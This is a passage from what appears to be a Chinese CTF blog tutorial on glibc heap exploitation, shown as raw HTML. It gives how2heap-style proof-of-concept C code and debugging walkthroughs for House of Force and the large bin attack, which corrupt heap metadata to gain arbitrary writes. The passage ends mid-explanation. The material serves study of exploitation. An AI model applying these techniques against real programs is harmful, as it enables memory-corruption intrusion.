                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_G7UVK2Z39Q7V4N2.png"
                      alt="图片描述"
                ><br>然后将<code>fake_chunk_size</code>改为<code>fake_size</code>，然后将堆块<code>b</code>的<code>prev_size</code>改为改为<code>fake_size</code>，绕过检查<code>prev_size == size</code>的检查。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_2UT6ZP9UTJP74U9.png"
                      alt="图片描述"
                ><br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_4DKB7Y89T8FSWD8.png"
                      alt="图片描述"
                ><br>我们<code>free(b)</code>后，会进行如上检查。向后合并会把负数<code>fake_size</code>转为整数，然后会先开始后合并，又<code>chunk_b</code>紧邻<code>top_chunk</code>，会再与其进行合并。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_7ZCUWQ3KAVGKAB7.png"
                      alt="图片描述"
                ><br>此时我们再申请堆块将从<code>fake_chunk_prev_size</code>开始分配。</p>
<h2 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house_of_force"></a>house_of_force</h2><p><code>glibc &lt; 2.29</code></p>
<h3 id="源码-11"><a href="#源码-11" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   This PoC works also with ASLR enabled.</span></span><br><span class="line"><span class="comment">   It will overwrite a GOT entry so in order to apply exactly this technique RELRO must be disabled.</span></span><br><span class="line"><span class="comment">   If RELRO is enabled you can always try to return a chunk on the stack as proposed in Malloc Des Maleficarum </span></span><br><span class="line"><span class="comment">   ( http://phrack.org/issues/66/10.html )</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   Tested in Ubuntu 14.04, 64bit, Ubuntu 18.04</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> bss_var[] = <span class="string">&quot;This is a string that we want to overwrite.&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc , <span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nWelcome to the House of Force\n\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;The top chunk is a special chunk. Is the last in memory &quot;</span></span><br><span class="line">		<span class="string">&quot;and is the chunk that will be resized when malloc asks for more space from the os.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nIn the end, we will use this to overwrite a variable at %p.\n&quot;</span>, bss_var);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Its current value is: %s\n&quot;</span>, bss_var);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nLet&#x27;s allocate the first chunk, taking space from the wilderness.\n&quot;</span>);</span><br><span class="line">	<span class="type">intptr_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">256</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;The chunk of 256 bytes has been allocated at %p.\n&quot;</span>, p1 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nNow the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.\n&quot;</span>);</span><br><span class="line">	<span class="type">int</span> real_size = <span class="built_in">malloc_usable_size</span>(p1);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Real size (aligned and all that jazz) of our allocated chunk is %ld.\n&quot;</span>, real_size + <span class="built_in">sizeof</span>(<span class="type">long</span>)*<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nNow let&#x27;s emulate a vulnerability that can overwrite the header of the Top Chunk\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//----- VULNERABILITY ----</span></span><br><span class="line">	<span class="type">intptr_t</span> *ptr_top = (<span class="type">intptr_t</span> *) ((<span class="type">char</span> *)p1 + real_size - <span class="built_in">sizeof</span>(<span class="type">long</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nThe top chunk starts at %p\n&quot;</span>, ptr_top);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nOverwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Old size of top chunk %#llx\n&quot;</span>, *((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *)((<span class="type">char</span> *)ptr_top + <span class="built_in">sizeof</span>(<span class="type">long</span>))));</span><br><span class="line">	*(<span class="type">intptr_t</span> *)((<span class="type">char</span> *)ptr_top + <span class="built_in">sizeof</span>(<span class="type">long</span>)) = <span class="number">-1</span>;</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;New size of top chunk %#llx\n&quot;</span>, *((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *)((<span class="type">char</span> *)ptr_top + <span class="built_in">sizeof</span>(<span class="type">long</span>))));</span><br><span class="line">	<span class="comment">//------------------------</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nThe size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.\n&quot;</span></span><br><span class="line">	   <span class="string">&quot;Next, we will allocate a chunk that will get us right up against the desired region (with an integer\n&quot;</span></span><br><span class="line">	   <span class="string">&quot;overflow) and will then be able to allocate a chunk right over the desired region.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * The evil_size is calulcated as (nb is the number of bytes requested + space for metadata):</span></span><br><span class="line"><span class="comment">	 * new_top = old_top + nb</span></span><br><span class="line"><span class="comment">	 * nb = new_top - old_top</span></span><br><span class="line"><span class="comment">	 * req + 2sizeof(long) = new_top - old_top</span></span><br><span class="line"><span class="comment">	 * req = new_top - old_top - 2sizeof(long)</span></span><br><span class="line"><span class="comment">	 * req = dest - 2sizeof(long) - old_top - 2sizeof(long)</span></span><br><span class="line"><span class="comment">	 * req = dest - old_top - 4*sizeof(long)</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> evil_size = (<span class="type">unsigned</span> <span class="type">long</span>)bss_var - <span class="built_in">sizeof</span>(<span class="type">long</span>)*<span class="number">4</span> - (<span class="type">unsigned</span> <span class="type">long</span>)ptr_top;</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,\n&quot;</span></span><br><span class="line">	   <span class="string">&quot;we will malloc %#lx bytes.\n&quot;</span>, bss_var, ptr_top, evil_size);</span><br><span class="line">	<span class="type">void</span> *new_ptr = <span class="built_in">malloc</span>(evil_size);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;As expected, the new pointer is at the same place as the old top chunk: %p\n&quot;</span>, new_ptr - <span class="built_in">sizeof</span>(<span class="type">long</span>)*<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">void</span>* ctr_chunk = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nNow, the next chunk we overwrite will point at our target buffer.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;malloc(100) =&gt; %p!\n&quot;</span>, ctr_chunk);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now, we can finally overwrite that value:\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;... old string: %s\n&quot;</span>, bss_var);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;... doing strcpy overwrite with \&quot;YEAH!!!\&quot;...\n&quot;</span>);</span><br><span class="line">	<span class="built_in">strcpy</span>(ctr_chunk, <span class="string">&quot;YEAH!!!&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;... new string: %s\n&quot;</span>, bss_var);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">assert</span>(ctr_chunk == bss_var);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">// some further discussion:</span></span><br><span class="line">	<span class="comment">//fprintf(stderr, &quot;This controlled malloc will be called with a size parameter of evil_size = malloc_got_address - 8 - p2_guessed\n\n&quot;);</span></span><br><span class="line">	<span class="comment">//fprintf(stderr, &quot;This because the main_arena-&gt;top pointer is setted to current av-&gt;top + malloc_size &quot;</span></span><br><span class="line">	<span class="comment">//	&quot;and we \nwant to set this result to the address of malloc_got_address-8\n\n&quot;);</span></span><br><span class="line">	<span class="comment">//fprintf(stderr, &quot;In order to do this we have malloc_got_address-8 = p2_guessed + evil_size\n\n&quot;);</span></span><br><span class="line">	<span class="comment">//fprintf(stderr, &quot;The av-&gt;top after this big malloc will be setted in this way to malloc_got_address-8\n\n&quot;);</span></span><br><span class="line">	<span class="comment">//fprintf(stderr, &quot;After that a new call to malloc will return av-&gt;top+8 ( +8 bytes for the header ),&quot;</span></span><br><span class="line">	<span class="comment">//	&quot;\nand basically return a chunk at (malloc_got_address-8)+8 = malloc_got_address\n\n&quot;);</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//fprintf(stderr, &quot;The large chunk with evil_size has been allocated here 0x%08x\n&quot;,p2);</span></span><br><span class="line">	<span class="comment">//fprintf(stderr, &quot;The main_arena value av-&gt;top has been setted to malloc_got_address-8=0x%08x\n&quot;,malloc_got_address);</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//fprintf(stderr, &quot;This last malloc will be served from the remainder code and will return the av-&gt;top+8 injected before\n&quot;);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="调试-11"><a href="#调试-11" class="headerlink" title="调试"></a>调试</h3><p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_D3DCDBFN6BFS7AY.png"
                      alt="图片描述"
                ><br>首先申请了一个<code>a_real=0x111</code>大小的堆块，利用<code>off-by-one</code>将<code>top_chunk</code>的<code>size</code>改为<code>-1</code>，此时我们便可以申请到任意地址，<code>top_chunk地址 = 原top_chunk地址 + 对齐后的申请大小</code>。只要我们计算好距离，便可申请到任意地址，下到<code>got</code>,<code>bss</code>，上到<code>__malloc_hook</code>，相当于任意地址写的能力。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_KN4WJWSJJ4HC9VE.png"
                      alt="图片描述"
                ><br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_FRYZ59TQMSFW6TK.png"
                      alt="图片描述"
                ><br>计算出<code>bss_var-0x20</code>到<code>top_chunk</code>的距离<code>0x602060-0x603110=-5A2 E0B0</code>，注意此时我们申请结束后，<code>top_chunk=0x6030110+(-5A2EB0)+0x10=0x602070</code>，成功将top_chunk迁移到了目标地址下方。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_QRUXTS646FKXEAS.png"
                      alt="图片描述"
                ><br>堆由低地址向高地址增长，我们此时申请<code>0x68</code>大小的堆块时，<code>top_chunk=0x602070+0x68+0x8=0x6020e0</code>，成功将目标地址放入新申请堆块的<code>fd</code>指针处。</p>
<h2 id="large-bin-attack"><a href="#large-bin-attack" class="headerlink" title="large_bin_attack"></a>large_bin_attack</h2><p><code>glibc-2.29</code> 之前的 <code>large_bin_attack</code> 可以修改两个值。</p>
<h3 id="源码-12"><a href="#源码-12" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    This technique is taken from</span></span><br><span class="line"><span class="comment">    https://dangokyo.me/2018/04/07/a-revisit-to-large-bin-in-glibc/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    [...]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">              else</span></span><br><span class="line"><span class="comment">              &#123;</span></span><br><span class="line"><span class="comment">                  victim-&gt;fd_nextsize = fwd;</span></span><br><span class="line"><span class="comment">                  victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span></span><br><span class="line"><span class="comment">                  fwd-&gt;bk_nextsize = victim;</span></span><br><span class="line"><span class="comment">                  victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span></span><br><span class="line"><span class="comment">              &#125;</span></span><br><span class="line"><span class="comment">              bck = fwd-&gt;bk;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    [...]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    mark_bin (av, victim_index);</span></span><br><span class="line"><span class="comment">    victim-&gt;bk = bck;</span></span><br><span class="line"><span class="comment">    victim-&gt;fd = fwd;</span></span><br><span class="line"><span class="comment">    fwd-&gt;bk = victim;</span></span><br><span class="line"><span class="comment">    bck-&gt;fd = victim;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    For more details on how large-bins are handled and sorted by ptmalloc,</span></span><br><span class="line"><span class="comment">    please check the Background section in the aforementioned link.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    [...]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;This file demonstrates large bin attack by writing a large unsigned long value into stack\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;In practice, large bin attack is generally prepared for further attacks, such as rewriting the &quot;</span></span><br><span class="line">           <span class="string">&quot;global variable global_max_fast in libc for further fastbin attack\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack_var1 = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack_var2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Let&#x27;s first look at the targets we want to rewrite on stack:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;stack_var1 (%p): %ld\n&quot;</span>, &amp;stack_var1, stack_var1);</span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;stack_var2 (%p): %ld\n\n&quot;</span>, &amp;stack_var2, stack_var2);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now, we allocate the first large chunk on the heap at: %p\n&quot;</span>, p1 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;</span></span><br><span class="line">           <span class="string">&quot; the first large chunk during the free()\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Then, we allocate the second large chunk on the heap at: %p\n&quot;</span>, p2 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;</span></span><br><span class="line">           <span class="string">&quot; the second large chunk during the free()\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Finally, we allocate the third large chunk on the heap at: %p\n&quot;</span>, p3 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">           <span class="string">&quot; the third large chunk during the free()\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;We free the first and second large chunks now and they will be inserted in the unsorted bin:&quot;</span></span><br><span class="line">           <span class="string">&quot; [ %p &lt;--&gt; %p ]\n\n&quot;</span>, (<span class="type">void</span> *)(p2 - <span class="number">2</span>), (<span class="type">void</span> *)(p2[<span class="number">0</span>]));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the&quot;</span></span><br><span class="line">            <span class="string">&quot; freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation&quot;</span></span><br><span class="line">            <span class="string">&quot;, and reinsert the remaining of the freed first large chunk into the unsorted bin:&quot;</span></span><br><span class="line">            <span class="string">&quot; [ %p ]\n\n&quot;</span>, (<span class="type">void</span> *)((<span class="type">char</span> *)p1 + <span class="number">0x90</span>));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p3);</span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now, we free the third large chunk and it will be inserted in the unsorted bin:&quot;</span></span><br><span class="line">           <span class="string">&quot; [ %p &lt;--&gt; %p ]\n\n&quot;</span>, (<span class="type">void</span> *)(p3 - <span class="number">2</span>), (<span class="type">void</span> *)(p3[<span class="number">0</span>]));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now emulating a vulnerability that can overwrite the freed second large chunk&#x27;s \&quot;size\&quot;&quot;</span></span><br><span class="line">            <span class="string">&quot; as well as its \&quot;bk\&quot; and \&quot;bk_nextsize\&quot; pointers\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk&quot;</span></span><br><span class="line">            <span class="string">&quot; at the head of the large bin freelist. To overwrite the stack variables, we set \&quot;bk\&quot; to 16 bytes before stack_var1 and&quot;</span></span><br><span class="line">            <span class="string">&quot; \&quot;bk_nextsize\&quot; to 32 bytes before stack_var2\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    p2[<span class="number">-1</span>] = <span class="number">0x3f1</span>;</span><br><span class="line">    p2[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var1 - <span class="number">2</span>);</span><br><span class="line">    p2[<span class="number">3</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var2 - <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Let&#x27;s malloc again, so the freed third large chunk being inserted into the large bin freelist.&quot;</span></span><br><span class="line">            <span class="string">&quot; During this time, targets should have already been rewritten:\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;stack_var1 (%p): %p\n&quot;</span>, &amp;stack_var1, (<span class="type">void</span> *)stack_var1);</span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;stack_var2 (%p): %p\n&quot;</span>, &amp;stack_var2, (<span class="type">void</span> *)stack_var2);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// sanity check</span></span><br><span class="line">    <span class="built_in">assert</span>(stack_var1 != <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">assert</span>(stack_var2 != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p>large bin 结构图。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_VFQNFY7QR4V8CRG-1695379768564-24.webp"
                      alt="图片描述"
                ></p>
<ol>
<li>大于 0x400 的 chunk 属于 large bin 范畴。</li>
<li>fd -&gt; 后一个大小相同的 chunk，bk 指向前一个大小相同的 chunk。</li>
<li>fd_nextsize -&gt; 比他小的最大heap。</li>
<li>bk_nextsize -&gt; 比他大的最小的heap。</li>
<li>最后将两条链条首尾相连。</li>
</ol>
<h3 id="调试-12"><a href="#调试-12" class="headerlink" title="调试"></a>调试</h3><p>首先栈上放置两个值为 0 的栈变量。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_B9PMX7Y6BUNXX68-1695379746623-20.webp"
                      alt="图片描述"
                ><br>然后布置如下结构的堆。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_NTGAR62F4NUUEPD-1695379792691-27.webp"
                      alt="图片描述"
                ><br>依次释放 non-fast 大小的 p1, p2，它们将会被挂到 unsorted bin 。并且 p2-&gt;p1 。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_PH5MQPBFFHH6UWF-1695379744185-16.webp"
                      alt="图片描述"
                ><br>此时申请 0x90 大小的堆块将会遍历 unsorted bin , 但 unsorted bin 中并无正好合适的 chunk 。所以会切割先进来的 p1 成为 last_remainder 留在 unsorted bin，并把 p2 放进 large bin 。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_KMUDJ58864BVGRJ-1695379733565-12.webp"
                      alt="图片描述"
                ><br>之后 free(p3)，p3 进入 unsorted bin , p3-&gt;p1。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_7R56GD8898CAHVC-1695379732363-10.webp"
                      alt="图片描述"
                ><br>然后如下修改 p2 的结构，让 p3_size &gt; p2_size ，以便后续利用。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_C845XWYM8RY6FP2-1695379729718-6.webp"
                      alt="图片描述"
                ><br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_FSXFTBKCRMVYT59-1695379728616-4.webp"
                      alt="图片描述"
                ><br>此时 p2 结构如下。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_NWAPT4CW7S4UWB8-1695379724638-1.webp"
                      alt="图片描述"
                ><br>再次申请 0x90 大小的堆块，将会再次遍历 unsorted bin 。将 p1 切割，将 p3 放进 unsorted bin 。<br>放入过程中如果 p3_size &gt; p2_size 。将会执行如下代码:</p>
